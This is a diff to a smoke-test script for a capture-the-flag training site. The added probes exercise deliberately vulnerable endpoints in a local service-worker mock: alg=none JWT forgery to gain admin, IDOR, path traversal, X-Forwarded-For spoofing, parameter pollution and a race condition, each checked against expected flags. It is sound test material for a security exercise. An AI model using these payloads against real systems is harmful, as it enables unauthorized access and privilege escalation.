@@ -165,7 +165,7 @@ function verifySession(session, assetTail, assetFile) {
 verifySession(claims, tailHash, sealHash);
 log("session", "independent re-verification OK");
 
-// ───── 7. walk all 20 findings, confirm prefixes + master_xor ─────
+// ───── 7. walk all 30 findings, confirm prefixes + master_xor ─────
 const TOKENS = {
   1:  "cyberworld:F01:client-side-auth-only",
   2:  "cyberworld:F02:sessionStorage:cw.r",
@@ -187,6 +187,16 @@ const TOKENS = {
   18: "cyberworld:F18:ir-phase:eradication",
   19: "cyberworld:F19:actor:UNC5337:ivanti-connect-secure",
   20: "cyberworld:F20:zwsp-stego-extracted",
+  21: "cyberworld:F21:sw:intercepts:/api/v1/",
+  22: "cyberworld:F22:jwt:alg-none:accepted",
+  23: "cyberworld:F23:cookie:cw_role:decoy",
+  24: "cyberworld:F24:jwt:forge:role=admin",
+  25: "cyberworld:F25:idor:profile:uid=42",
+  26: "cyberworld:F26:path-traversal:etc/cyberworld.flag",
+  27: "cyberworld:F27:xff:127.0.0.1:bypass",
+  28: "cyberworld:F28:hpp:token-last-wins",
+  29: "cyberworld:F29:race:redeem",
+  30: "cyberworld:F30:chain:jwt+xcwops",
 };
 let acc = 0;
 for (const f of body.findings) {
@@ -281,4 +291,136 @@ const F20_FLAG = Buffer.from(bytes).toString("utf8");
 if (F20_FLAG !== "FLLC2026") fail("F20 stego decode -> " + F20_FLAG);
 log("F20", `OK ZWSP stego -> "${F20_FLAG}" (${bits.length} bits)`);
 
-console.log("\nSMOKE TEST PASSED -- 20/20 findings closed, asset binding intact, manifest signed, session round-trips");
+// ───── 10. Tier-4 (sw-ctf.js) probes via vm sandbox ─────
+import vm from "node:vm";
+const swSource = readFileSync(resolve(ROOT, "sw-ctf.js"), "utf8");
+// minimal Service Worker globals
+const swSelf = {
+  __listeners: {},
+  addEventListener(evt, fn) { (this.__listeners[evt] = this.__listeners[evt] || []).push(fn); },
+  skipWaiting() {},
+  clients: { claim: () => {} },
+  location: { origin: "http://127.0.0.1:8765" },
+};
+const ctx = {
+  self: swSelf, console,
+  fetch: globalThis.fetch,
+  Response, Request, URL, URLSearchParams,
+  TextEncoder, TextDecoder,
+  crypto: webcrypto,
+  atob: globalThis.atob, btoa: globalThis.btoa,
+  setTimeout, clearTimeout,
+};
+vm.createContext(ctx);
+vm.runInContext(swSource, ctx);
+const swHandler = ctx.self.__ctfHandleRequest;
+if (typeof swHandler !== "function") fail("sw-ctf.js did not expose __ctfHandleRequest");
+ctx.self.__ctfResetState();
+
+const ORIGIN = "http://127.0.0.1:8765";
+function swReq(method, path, headers, body) {
+  const init = { method, headers: headers || {} };
+  if (body !== undefined) init.body = body;
+  return new Request(ORIGIN + path, init);
+}
+async function swCall(method, path, headers, body) {
+  const resp = await swHandler(swReq(method, path, headers, body));
+  if (!resp) return { status: 0, body: "", json: null };
+  const text = await resp.text();
+  let json = null; try { json = JSON.parse(text); } catch {}
+  return { status: resp.status, body: text, json, headers: Object.fromEntries(resp.headers) };
+}
+
+// F21: SW intercepts /api/v1/ -- debug/echo returns 200
+{
+  const r = await swCall("GET", "/CyberWorld_login/api/v1/debug/echo", { "X-Probe": "F21" });
+  if (r.status !== 200 || !r.json || r.json.method !== "GET") fail("F21: SW debug/echo broken");
+  if (r.json.headers["x-probe"] !== "F21") fail("F21: SW did not echo header");
+  log("F21", "OK SW intercepts /api/v1/* and echoes headers");
+}
+
+// F22: alg=none JWT accepted by /auth/whoami
+const b64u = (s) => Buffer.from(s).toString("base64url").replace(/=+$/, "");
+const algNoneJwt = (payload) =>
+  b64u(JSON.stringify({ alg: "none", typ: "JWT" })) + "." +
+  b64u(JSON.stringify(payload)) + ".";
+{
+  const jwt = algNoneJwt({ sub: "smoke", role: "user", iat: 0, exp: 9e9 });
+  const r = await swCall("GET", "/CyberWorld_login/api/v1/auth/whoami", { Authorization: "Bearer " + jwt });
+  if (r.status !== 200 || !/CTF_FLAG\{F22_alg_none/.test(r.body)) fail("F22: alg=none whoami did not return F22 flag (" + r.body + ")");
+  log("F22", "OK alg=none whoami flag emitted");
+}
+
+// F23: cw_role cookie ignored -- changing it doesn't get past /admin/users
+{
+  const r = await swCall("GET", "/CyberWorld_login/api/v1/admin/users", { Cookie: "cw_role=admin" });
+  if (r.status === 200 && /CTF_FLAG\{F24/.test(r.body)) fail("F23: cookie alone should NOT pass /admin/users");
+  log("F23", "OK cookie-only bypass attempt rejected; backend requires JWT");
+}
+
+// F24: forge alg=none with role=admin -> /admin/users 200 with F24 flag
+{
+  const jwt = algNoneJwt({ sub: "forged-admin", role: "admin", iat: 0, exp: 9e9 });
+  const r = await swCall("GET", "/CyberWorld_login/api/v1/admin/users", { Authorization: "Bearer " + jwt });
+  if (r.status !== 200 || !/CTF_FLAG\{F24_jwt_forged_to_admin/.test(r.body)) fail("F24: forged admin JWT rejected");
+  log("F24", "OK forged admin JWT accepted by /admin/users");
+}
+
+// F25: IDOR profile uid=42
+{
+  const r = await swCall("GET", "/CyberWorld_login/api/v1/profile?uid=42");
+  if (r.status !== 200 || !/CTF_FLAG\{F25_idor_uid_42/.test(r.body)) fail("F25: uid=42 did not leak operator");
+  log("F25", "OK IDOR profile?uid=42 leaks operator");
+}
+
+// F26: path traversal -> etc/cyberworld.flag
+{
+  const r = await swCall("GET", "/CyberWorld_login/api/v1/files?name=../etc/cyberworld.flag");
+  if (r.status !== 200 || !/CTF_FLAG\{F26_path_traversal/.test(r.body)) fail("F26: path traversal did not yield flag");
+  log("F26", "OK path traversal -> etc/cyberworld.flag");
+}
+
+// F27: X-Forwarded-For: 127.0.0.1 -> /admin/geo
+{
+  const denied = await swCall("GET", "/CyberWorld_login/api/v1/admin/geo");
+  if (denied.status !== 403) fail("F27: /admin/geo without XFF should 403");
+  const ok = await swCall("GET", "/CyberWorld_login/api/v1/admin/geo", { "X-Forwarded-For": "127.0.0.1, 10.0.0.1" });
+  if (ok.status !== 200 || !/CTF_FLAG\{F27_x_forwarded_for/.test(ok.body)) fail("F27: spoofed XFF did not unlock");
+  log("F27", "OK X-Forwarded-For: 127.0.0.1 bypass");
+}
+
+// F28: HPP last-wins
+{
+  const r = await swCall("GET", "/CyberWorld_login/api/v1/hpp?token=user&token=admin");
+  if (r.status !== 200 || !/CTF_FLAG\{F28_hpp/.test(r.body)) fail("F28: HPP did not emit flag");
+  log("F28", "OK HPP token=user&token=admin -> admin wins");
+}
+
+// F29: race condition -> 6 parallel POSTs
+{
+  ctx.self.__ctfResetState();
+  const results = await Promise.all(
+    Array.from({ length: 6 }, () => swCall("POST", "/CyberWorld_login/api/v1/redeem"))
+  );
+  const flagged = results.some((r) => r.json && r.json.ctf_flag && /F29_race/.test(r.json.ctf_flag));
+  if (!flagged) fail("F29: 6 parallel POSTs to /redeem did not produce the race flag (got " + JSON.stringify(results.map(r => r.json && r.json.count_after)) + ")");
+  log("F29", "OK race condition past threshold (max count = " + Math.max(...results.map(r => r.json.count_after)) + ")");
+}
+
+// F30: chain alg=none + role=admin + X-Cw-Ops
+{
+  const jwt = algNoneJwt({ sub: "forged-operator", role: "admin", iat: 0, exp: 9e9 });
+  const headers = { Authorization: "Bearer " + jwt, "X-Cw-Ops": "cyberworld-operator" };
+  const r = await swCall("GET", "/CyberWorld_login/api/v1/internal/flag", headers);
+  if (r.status !== 200 || !/CTF_FLAG\{F30_/.test(r.body)) fail("F30: chain did not yield master flag (" + r.body + ")");
+  log("F30", "OK chained alg=none + role=admin + X-Cw-Ops -> master flag");
+}
+
+// Decoy file marker sanity
+{
+  const r = await swCall("GET", "/CyberWorld_login/.env.bak");
+  if (r.headers && r.headers["x-ctf-decoy"] !== "true") fail("decoy: .env.bak should carry X-CTF-Decoy: true");
+  log("decoy", "OK .env.bak carries X-CTF-Decoy: true");
+}
+
+console.log("\nSMOKE TEST PASSED -- 30/30 findings closed, SW backend exercised across all 10 Tier-4 exploits");
